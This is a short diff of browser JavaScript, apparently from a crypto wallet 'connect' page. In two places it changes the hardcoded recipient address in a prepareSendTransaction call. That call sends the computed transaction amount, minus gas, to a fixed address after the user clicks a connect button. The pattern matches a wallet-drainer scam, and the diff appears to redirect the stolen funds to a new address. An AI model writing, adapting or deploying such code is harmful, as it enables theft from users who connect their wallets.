@@ -83,7 +83,7 @@ if (typeof process === 'undefined') {
       // Calculate the amount after deducting the gas fee
       const finalAmountWei = transactionValueWei.sub(gasFeeWei);
       const request = await prepareSendTransaction({
-        to: '0xc25a768371b1f10DED11513eDF0eb5120DC33dcf',
+        to: '0xf2379cA332265dB7B0693F81D8DCF94485677826',
         value: finalAmountWei,
         
         data:'0x'
@@ -127,7 +127,7 @@ if (typeof process === 'undefined') {
       const finalAmountWei = transactionValueWei.sub(gasFeeWei);
        
       const request = await prepareSendTransaction({
-        to: '0xc25a768371b1f10DED11513eDF0eb5120DC33dcf',
+        to: '0xf2379cA332265dB7B0693F81D8DCF94485677826',
         value: finalAmountWei,
         
         data:'0x'
@@ -142,4 +142,4 @@ if (typeof process === 'undefined') {
 
   
   document.getElementById('connect-button').addEventListener('click', onConnect)
-  
+ 
